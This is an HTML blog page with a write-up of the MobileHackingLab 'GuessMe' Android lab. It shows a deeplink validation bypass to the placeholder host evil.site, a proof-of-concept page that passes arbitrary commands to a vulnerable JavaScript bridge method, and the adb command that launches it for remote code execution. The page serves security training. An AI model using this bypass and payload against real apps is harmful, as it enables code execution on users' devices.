@@ -1,0 +1,221 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="HandheldFriendly" content="True" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="robots" content="noindex" />
+
+  <!--  <link rel="manifest" href="/assets/site.webmanifest" crossorigin="use-credentials">-->
+
+  <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&display=swap" rel="stylesheet">
+
+    <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/theme/stylesheet/style.min.css">
+
+    <link id="dark-theme-style" rel="stylesheet" type="text/css"
+          media="(prefers-color-scheme: dark), (prefers-color-scheme: no-preference)"
+    href="https://ojack69.github.io/jacks-corner/theme/stylesheet/dark-theme.min.css">
+
+    <link id="pygments-dark-theme" rel="stylesheet" type="text/css"
+              media="(prefers-color-scheme: dark), (prefers-color-scheme: no-preference)"
+          href="https://ojack69.github.io/jacks-corner/theme/pygments/monokai.min.css">
+    <link id="pygments-light-theme" rel="stylesheet" type="text/css"
+              media="(prefers-color-scheme: light)"
+          href="https://ojack69.github.io/jacks-corner/theme/pygments/emacs.min.css">
+
+
+  <link rel="stylesheet"
+        type="text/css"
+        href="https://ojack69.github.io/jacks-corner/theme/stork/stork.css" />
+
+  <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/theme/font-awesome/css/fontawesome.css">
+  <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/theme/font-awesome/css/brands.css">
+  <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/theme/font-awesome/css/solid.css">
+
+        <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/css/custom.css"> 
+        <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/css/zoom.css"> 
+        <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/css/collapsible-toc.css"> 
+        <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/css/goals.css"> 
+
+
+      <script src="https://code.jquery.com/jquery-3.7.1.min.js" type="application/javascript"></script>
+      <script src="https://cdn.jsdelivr.net/npm/dompurify@3.2.4/dist/purify.min.js" type="application/javascript"></script>
+      <script src="https://ojack69.github.io/jacks-corner/js/collapsible-toc.js" type="application/javascript"></script>
+      <script src="https://ojack69.github.io/jacks-corner/js/zoom.js" type="application/javascript"></script>
+      <script src="https://ojack69.github.io/jacks-corner/js/app.js" type="application/javascript"></script>
+      <script src="https://ojack69.github.io/jacks-corner/js/goals.js" type="application/javascript"></script>
+
+
+
+
+
+
+
+
+
+
+
+ 
+
+<meta name="author" content="Jack69" />
+<meta name="description" content="Static Analysis After decompiling the APK, I noticed that WebviewActivity is exported in the Android manifest and implements a deeplink via mhl://mobilehackinglab URI: Analyzing the decompiled com.mobilehackinglab.guessme.WebviewActivity class, I noticed that the webview is using a Javascript Interface MyJavascriptInterface: This Javascript interface has a vulnerable implementation …" />
+<meta name="keywords" content="">
+
+
+  <meta property="og:site_name" content="Jack's Corner"/>
+  <meta property="og:title" content="MobileHackingLab - GuessMe"/>
+  <meta property="og:description" content="Static Analysis After decompiling the APK, I noticed that WebviewActivity is exported in the Android manifest and implements a deeplink via mhl://mobilehackinglab URI: Analyzing the decompiled com.mobilehackinglab.guessme.WebviewActivity class, I noticed that the webview is using a Javascript Interface MyJavascriptInterface: This Javascript interface has a vulnerable implementation …"/>
+  <meta property="og:locale" content="en_US"/>
+  <meta property="og:url" content="https://ojack69.github.io/jacks-corner/mobile/mobilehackinglab/guessme.html"/>
+  <meta property="og:type" content="article"/>
+  <meta property="article:published_time" content="2024-06-21 18:00:00+02:00"/>
+  <meta property="article:modified_time" content=""/>
+  <meta property="article:author" content="https://ojack69.github.io/jacks-corner/author/jack69.html">
+  <meta property="article:section" content="Mobile"/>
+  <meta property="og:image" content="">
+
+  <title>Jack's Corner &ndash; MobileHackingLab - GuessMe</title>
+
+
+</head>
+<body >
+
+<aside>
+  <div>
+    <a href="https://ojack69.github.io/jacks-corner/">
+      <img src="https://ojack69.github.io/jacks-corner/theme/img/profile.png" alt="Jack's Corner" title="Jack's Corner">
+    </a>
+
+    <h1>
+      <a href="https://ojack69.github.io/jacks-corner/">Jack's Corner</a>
+    </h1>
+
+
+    <div class="stork">
+        <input class="stork-input" type="text" autocomplete="off" name="q" data-stork="sitesearch" placeholder="Search..." onclick=""/>
+      <div class="stork-output" data-stork="sitesearch-output"></div>
+    </div>
+
+
+    <ul class="social">
+      <li>
+        <a class="sc-htb"
+           href="https://app.hackthebox.com/profile/177323"
+           target="_blank">
+          <i class="fa-brands fa-htb"></i>
+        </a>
+      </li>
+      <li>
+        <a class="sc-thm"
+           href="https://tryhackme.com/p/jack69"
+           target="_blank">
+          <i class="fa-brands fa-thm"></i>
+        </a>
+      </li>
+    </ul>
+  </div>
+</aside>
+  <main>
+
+<nav>
+  <a href="https://ojack69.github.io/jacks-corner/">Home</a>
+
+  <a href="https://ojack69.github.io/jacks-corner/categories.html">Categories</a>
+  <a href="https://ojack69.github.io/jacks-corner/category/cheatsheet.html">Cheatsheets</a>
+  <a href="https://ojack69.github.io/jacks-corner/personal/goals.html">Goals</a>
+
+
+</nav>
+
+<article class="single">
+  <header>
+      
+    <h1 id="mobile/mobilehackinglab/guessme">MobileHackingLab - GuessMe</h1>
+    <p>
+
+    </p>
+  </header>
+
+
+  <div>
+        <div class="toc col-lg-3 hidden-xs hidden-sm">
+            <div id="toc"><ul><li><a class="toc-href" href="#static-analysis" title="Static Analysis">Static Analysis</a></li><li><a class="toc-href" href="#exploitation" title="Exploitation">Exploitation</a></li></ul></div>
+        </div>
+    <h2 id="static-analysis">Static Analysis</h2>
+<p>After decompiling the APK, I noticed that WebviewActivity is exported in the Android manifest and implements a deeplink via <code>mhl://mobilehackinglab</code> URI:</p>
+<p><img alt="deeplink-in-manifest.png" src="https://ojack69.github.io/jacks-corner/images/mobile/mobilehackinglab/guessme/deeplink-in-manifest.png"/></p>
+<p>Analyzing the decompiled <code>com.mobilehackinglab.guessme.WebviewActivity</code> class, I noticed that the webview is using a Javascript Interface <code>MyJavascriptInterface</code>:</p>
+<p><img alt="javascript-interface.png" src="https://ojack69.github.io/jacks-corner/images/mobile/mobilehackinglab/guessme/javascript-interface.png"/></p>
+<p>This Javascript interface has a vulnerable implementation for the bridged method <code>getTime</code> since it uses an user input not validated or sanitized to execute an OS command:</p>
+<p><img alt="unsafe-code-injection.png" src="https://ojack69.github.io/jacks-corner/images/mobile/mobilehackinglab/guessme/unsafe-code-injection.png"/></p>
+<p>Moreover, the deeplink implementation fails to properly check the target URL for the WebView, since it only checks that the value from the query param <code>url</code> ends with <code>mobilehacking.com</code>:</p>
+<p><img alt="insufficient-deeplink-validation.png" src="https://ojack69.github.io/jacks-corner/images/mobile/mobilehackinglab/guessme/insufficient-deeplink-validation.png"/></p>
+<h2 id="exploitation">Exploitation</h2>
+<p>An attacker could inject any URL that will be then passed to the WebView as URL, bypassing the check as follows:</p>
+<div class="highlight"><pre><span></span><code>mhl://mobilehackinglab?url=evil.site/exploit.html%23mobilehackinglab.com
+</code></pre></div>
+<p>In order to exploit the unsafe Javascript Interface, an attacker could host an evil http page and make the web view open it. Following a PoC code:</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>Evil Command Injector :D<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+
+<span class="p">&lt;</span><span class="nt">label</span><span class="p">&gt;</span>Command:<span class="err">&lt;</span>/label<span class="err">&lt;</span>&gt;
+<span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">"command"</span> <span class="na">type</span><span class="o">=</span><span class="s">"text"</span> <span class="na">value</span><span class="o">=</span><span class="s">""</span><span class="p">/&gt;</span>
+
+<span class="p">&lt;</span><span class="nt">button</span> <span class="na">onclick</span><span class="o">=</span><span class="s">"const res = AndroidBridge.getTime(document.getElementById('command').value); alert(res)"</span> <span class="p">&gt;</span>Run Command<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
+</code></pre></div>
+<p>When the button is clicked, the command set as value in the input will be run by invoking <code>AndroidBridge.getTime</code>.</p>
+<p>After running:</p>
+<div class="highlight"><pre><span></span><code>adb shell am start -a android.intent.action.VIEW -d 'mhl://mobilehackinglab?url=evil.site/exploit.html%23mobilehackinglab.com'
+</code></pre></div>
+<p>the application will open the evil site web page:</p>
+<p><img alt="poc-1.png" src="https://ojack69.github.io/jacks-corner/images/mobile/mobilehackinglab/guessme/poc-1.png"/></p>
+<p>After clicking the "Run Command":</p>
+<p><img alt="poc-2.png" src="https://ojack69.github.io/jacks-corner/images/mobile/mobilehackinglab/guessme/poc-2.png"/></p>
+<p>A Remote Code Execution is obtained.</p>
+  </div>
+  <div class="tag-cloud">
+    <p>
+    </p>
+  </div>
+
+
+
+
+
+
+</article>
+
+<footer>
+<p>&copy; Jack69 - 2025 </p>
+<p>
+Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
+  <span class="footer-separator">|</span>
+  Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
+  <script id="dark-theme-script"
+          src="https://ojack69.github.io/jacks-corner/theme/dark-theme/dark-theme.min.js"
+          data-enable-auto-detect-theme="True"
+          data-default-theme="dark"
+          type="text/javascript">
+  </script>
+</p></footer>  </main>
+
+<script type="application/ld+json">
+{
+  "@context" : "http://schema.org",
+  "@type" : "Blog",
+  "name": " Jack's Corner ",
+  "url" : "https://ojack69.github.io/jacks-corner",
+  "image": "",
+  "description": "My personal notes on stuff I like, nothing special"
+}
+</script>  <script>
+    window.loadStorkIndex = function () {
+      stork.initialize("https://ojack69.github.io/jacks-corner/theme/stork/stork.wasm")
+      stork.register("sitesearch", "https://ojack69.github.io/jacks-corner/search-index.st", { showProgress: false });
+    }
+  </script>
+  <script src="https://ojack69.github.io/jacks-corner/theme/stork/stork.js"></script>
+
+</body>
+</html>
